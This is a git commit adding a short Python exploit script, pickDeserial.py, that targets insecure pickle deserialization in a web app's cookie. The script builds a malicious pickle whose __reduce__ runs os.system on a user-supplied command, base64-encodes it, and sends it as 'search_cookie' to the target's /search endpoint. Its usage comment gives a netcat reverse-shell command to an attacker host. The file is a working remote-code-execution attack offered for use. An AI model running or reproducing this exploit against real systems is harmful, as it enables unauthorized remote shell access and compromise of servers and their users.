e70d290fa8f6426fd37185f3bfdad1ac7f95bc5c
cd6629 <63489620+cd6629@users.noreply.github.com>
2020-12-22 04:51:21 -0500

    Create pickDeserial.py

---
+++ pickDeserial.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+#usage: python3 pick.py http://$ip:5003 "nc -e /bin/sh attackIP 53"
+import pickle, base64, os, requests, sys
+
+class RCE:
+	def __reduce__(self):
+		cmd = sys.argv[2]
+		return os.system, (cmd,)
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    cookie = base64.urlsafe_b64encode(pickled).decode('utf-8')
+
+    url = sys.argv[1]
+    r = requests.get(f"{url}/search", cookies={"search_cookie":cookie}) 
